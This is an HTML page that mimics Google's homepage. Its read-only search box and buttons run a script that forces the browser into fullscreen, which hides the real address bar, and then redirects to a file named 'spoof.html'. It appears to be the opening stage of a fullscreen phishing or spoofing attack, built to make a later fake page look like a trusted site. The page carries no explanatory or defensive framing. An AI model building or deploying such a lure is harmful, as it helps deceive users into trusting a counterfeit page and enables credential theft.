<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Google</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
  font-family: Roboto, Arial, sans-serif; background: #fff;
  display: flex; align-items: center; justify-content: center;
  min-height: 100vh; flex-direction: column; padding: 20px;
  -webkit-tap-highlight-color: transparent;
}
.logo { font-size: 68px; font-weight: 400; margin-bottom: 28px; }
.g{color:#4285f4}.o1{color:#ea4335}.o2{color:#fbbc05}.g2{color:#4285f4}.l{color:#34a853}.e{color:#ea4335}
.search {
  width: 85vw; max-width: 440px; padding: 14px 20px; font-size: 16px;
  border: 1px solid #dfe1e5; border-radius: 24px; outline: none;
  box-shadow: 0 1px 6px rgba(32,33,36,.1); text-align: center; cursor: pointer;
}
.btns { margin-top: 18px; display: flex; gap: 8px; }
.btns button {
  background: #f8f9fa; border: 1px solid #f8f9fa;
  padding: 10px 18px; border-radius: 4px; font-size: 14px;
  color: #3c4043; cursor: pointer;
}
.lang { margin-top: 24px; font-size: 12px; color: #5f6368; }
</style>
</head>
<body>

<div class="logo">
  <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
</div>

<input class="search" id="q" type="text" placeholder="Search Google or type a URL" autocomplete="off" readonly>

<div class="btns">
  <button id="b1">Google Search</button>
  <button id="b2">I'm Feeling Lucky</button>
</div>

<p class="lang">Google offered in: Bahasa Indonesia</p>

<script>
(function() {
  function go() {
    var el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    setTimeout(function() {
      window.location.href = 'spoof.html';
    }, 400);
  }

  document.getElementById('q').addEventListener('click', go);
  document.getElementById('b1').addEventListener('click', go);
  document.getElementById('b2').addEventListener('click', go);
})();
</script>

</body>
</html>
